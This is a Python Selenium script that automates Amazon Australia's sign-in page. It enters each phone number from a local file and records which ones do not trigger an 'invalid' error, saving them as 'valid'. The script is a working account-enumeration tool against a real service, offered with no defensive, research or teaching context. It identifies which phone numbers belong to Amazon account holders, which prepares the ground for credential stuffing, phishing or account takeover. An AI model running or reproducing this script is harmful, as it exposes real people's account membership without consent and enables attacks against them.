from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.chrome.options import Options
import os


try:

    options = Options()
    # options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    driver = webdriver.Chrome(
        executable_path="/home/silox/chromedriver", options=options
    )
    url = "https://www.amazon.com.au/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com.au%2F%3F_encoding%3DUTF8%26ref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=auflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&"

    phone_numbers = (
        open(f"{os.path.abspath(os.getcwd())}/12312321.txt", "r").read().split("\n")
    )

    for index, phone in enumerate(phone_numbers):
        driver.get(url)
        # time.sleep(0.5)
        text_input = driver.find_element(By.XPATH, '//*[@id="ap_email"]')
        phone = phone.strip()
        if not phone:
            continue
        text_input.send_keys(phone)
        text_input.send_keys(Keys.ENTER)
        # time.sleep(1)
        try:
            invalid = driver.find_element(
                By.XPATH, '//*[@id="auth-error-message-box"]/div/h4'
            ).text
            print(f"{index+1}. {phone} - Invalid")
        except:
            with open(f"{os.path.abspath(os.getcwd())}/valid_numbers.txt", "a") as f:
                f.write(phone)
                f.write("\n")
            print(f"{index+1}. {phone} - Valid")
        # time.sleep(0.5)
        # input('lllll')

    driver.quit()
except Exception as e:
    print(e)
    driver.quit()
    pass

input("Press enter to exit:")
